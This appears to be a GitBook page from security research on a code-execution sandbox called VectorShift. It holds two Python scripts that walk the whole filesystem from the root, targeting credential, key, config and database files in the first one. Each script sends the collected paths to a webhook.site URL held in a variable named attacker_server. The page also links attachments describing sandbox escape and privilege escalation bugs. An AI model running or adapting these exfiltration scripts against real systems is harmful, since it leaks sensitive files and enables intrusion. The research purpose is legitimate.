# Recursive File Finder

```python
import requests
import pathlib

def execute_requests(input_url):
    if input_url and isinstance(input_url, str) and len(input_url) > 5:
        attacker_server = input_url.strip()
    else:
        attacker_server = "https://webhook.site/6b2c9751-fc85-49b4-9b74-3bda8d23aa0d"

    data_payload = {
        "target_host": "VectorShift_Container",
        "scan_type": "File Enumeration (Multiple Extensions)",
        "found_files": []
    }
    logs = []

    try:
        root_dir = pathlib.Path("/")
        target_extensions = [
            '.py', '.txt', '.log', '.sh', '.env', '.conf', '.config', '.ini', '.cfg', '.yaml',
            '.yml', '.json', '.xml', '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.frm',
            '.ibd', '.myd', '.myi', '.js', '.java', '.c', '.cpp', '.h', '.hpp', '.go', '.rb',
            '.php', '.pl', '.bat', '.ps1', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.odt', '.ods', '.odp', '.zip', '.rar', '.tar', '.gz', '.7z', '.bz2',
            '.bak', '.backup', '.swp', '.swo', '.pem', '.key', '.crt', '.cer', '.pfx', '.jpg',
            '.jpeg', '.png', '.gif', '.mp3', '.mp4', '.avi', '.mov', '.exe', '.dll', '.msi',
            '.bin', '.out', '.whl', '.egg', '.jar', '.gem', '.npm', '.lock', '.html', '.htm',
            '.css', '.jsp', '.asp', '.aspx', '.csv', '.dat', '.sql', '.dbf'
        ]
        logs.append(f"[*] Scanning {root_dir.resolve()} for {target_extensions}...")
        count = 0

        for p in root_dir.rglob('*'):
            try:
                if p.is_file() and p.suffix in target_extensions:
                    full_path = str(p.resolve())
                    data_payload['found_files'].append(full_path)
                    count += 1
                    logs.append(f"[+] Found: {full_path}")
                    if count >= 500000:
                        logs.append(f"[!] Limit reached ({count} files). Stopping scan.")
                        break
            except PermissionError:
                logs.append(f"[-] Permission denied: {p}")

        logs.append(f"[+] Found {count} files.")
    except Exception as e:
        logs.append(f"[!] Enumeration Error: {str(e)}")
        data_payload['error'] = str(e)

    try:
        logs.append(f"[*] Exfiltrating list to {attacker_server}...")
        r = requests.post(attacker_server, json=data_payload, timeout=5)
        if r.status_code == 200:
            return {'scan_results': scan_results}
        else:
            return {"scan_results": f"FAILED: Webhook error {r.status_code}\n" + "\n".join(logs)}
    except Exception as e:
        return {"scan_results": f"EGRESS ERROR: {str(e)}\nLogs:\n" + "\n".join(logs)}
        
        
        
        
        
        
        
```





```python
import requests
import pathlib

def execute_requests(input_url):
    if input_url and isinstance(input_url, str) and len(input_url) > 5:
        attacker_server = input_url.strip()
    else:
        attacker_server = "https://webhook.site/6b2c9751-fc85-49b4-9b74-3bda8d23aa0d"

    data_payload = {
        "target_host": "VectorShift_Container",
        "scan_type": "Directory Listing (/)",
        "found_items": []
    }
    logs = []

    try:
        root_dir = pathlib.Path("/")
        logs.append(f"[*] Scanning {root_dir.resolve()}...")
        count = 0

        for p in root_dir.rglob('*'):
            try:
                full_path = str(p.resolve())
                data_payload['found_items'].append(full_path)
                count += 1
                logs.append(f"[+] Found: {full_path}")
                if count >= 50:
                    logs.append(f"[!] Limit reached ({count} items). Stopping scan.")
                    break
            except PermissionError:
                logs.append(f"[-] Permission denied: {p}")

        logs.append(f"[+] Found {count} items.")
    except Exception as e:
        logs.append(f"[!] Enumeration Error: {str(e)}")
        data_payload['error'] = str(e)

    try:
        logs.append(f"[*] Exfiltrating list to {attacker_server}...")
        r = requests.post(attacker_server, json=data_payload, timeout=5)
        if r.status_code == 200:
            return {"scan_results": f"SUCCESS: Directory list sent to Webhook.\nLogs:\n" + "\n".join(logs)}
        else:
            return {"scan_results": f"FAILED: Webhook error {r.status_code}\n" + "\n".join(logs)}
    except Exception as e:
        return {"scan_results": f"EGRESS ERROR: {str(e)}\nLogs:\n" + "\n".join(logs)}

if __name__ == "__main__":
    result = execute_requests(input_url="https://your-webhook-url-here")
    print(result["scan_results"])

```

{% file src="../.gitbook/assets/Bug-1_Unrestricted Outbound Traffic & Denial of Service (DoS) Amplification.py" %}

{% file src="../.gitbook/assets/Bug-2_Sandbox Escape via Library Bypass & Source Code Leakage in VectorShift.ai.py" %}

{% file src="../.gitbook/assets/Bug-3_Arbitrary Code Execution via Library Bypass io-runpy and Privilege Escalation.py" %}

{% file src="../.gitbook/assets/code_executor.py" %}

{% file src="../.gitbook/assets/telemetry collection.py" %}
